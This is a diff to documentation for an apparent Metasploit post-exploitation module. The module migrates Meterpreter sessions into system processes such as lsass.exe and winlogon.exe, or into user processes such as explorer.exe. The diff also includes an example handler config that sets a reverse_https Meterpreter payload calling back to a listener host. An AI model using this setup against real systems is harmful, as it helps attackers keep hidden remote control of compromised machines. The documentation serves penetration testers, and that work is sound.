@@ -14,6 +14,7 @@ This module is a nice addition to the beginning of an autorun script for post-Me
 - **ANAME** - This option allows you to specify a system level process that the module attempts to migrate to first if the session has admin rights. 
 - **NAME** - This option allows you to specify the user level process that the module attempts to migrate to first if the session has user rights or if admin migration fails through all of the default processes.  
 - **KILL** - This option allows you to kill the original process after a successful migration. The default value is FALSE.
+- **NOFAIL** - This option allows you to specify whether or not the module will migrate the session into a user level process if admin level migration fails. If TRUE, this may downgrade priviliged shells. The default value is FALSE.
 
 ## Module Process
 Here is the process that the module follows:
@@ -22,11 +23,13 @@ Here is the process that the module follows:
 - If the session has admin rights, it attempts to migrate to a system owned process in the following order:
     - ANAME (Module option, if specified)
     - services.exe
-    - winlogon.exe
     - wininit.exe
+    - svchost.exe
     - lsm.exe
     - lsass.exe
-- If it is unable to migrate to one of these processes, it drops to user level migration.
+    - winlogon.exe
+- The module will not migrate if the session has System rights and is already in one of the above target processes.
+- If it is unable to migrate to one of these processes, it drops to user level migration if NOFAIL is TRUE.
 - If the session has user rights, it attempts to migrate to a user owned process in the following order:  
     - NAME (Module option, if specified)
     - explorer.exe
@@ -53,7 +56,7 @@ set PAYLOAD windows/meterpreter/reverse_https
 set LHOST 192.168.1.101
 set LPORT 13002
 set ExitOnSession false
-set AutoRunScript multi_console_command -rc /home/user/auto.rc
+set AutoRunScript multi_console_command -r /home/user/auto.rc
 exploit -j
 ```
 
